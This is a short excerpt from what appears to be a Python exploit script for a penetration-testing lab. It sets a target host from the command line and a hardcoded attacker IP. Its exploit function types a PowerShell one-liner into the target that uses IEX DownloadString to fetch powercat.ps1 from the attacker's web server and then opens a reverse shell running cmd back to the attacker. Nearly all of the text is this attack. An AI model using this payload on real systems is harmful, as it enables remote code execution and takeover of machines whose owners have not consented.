...
try:
	rhost = sys.argv[1]
	lhost = "192.168.45.10" # Your Attacker/Kali IP
...
def exploit():
	...
	sleep(3)
	SendString(f"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}:{http_port}/powercat.ps1');powercat -c {lhost} -p {lport} -e cmd\"")
	SendReturn()
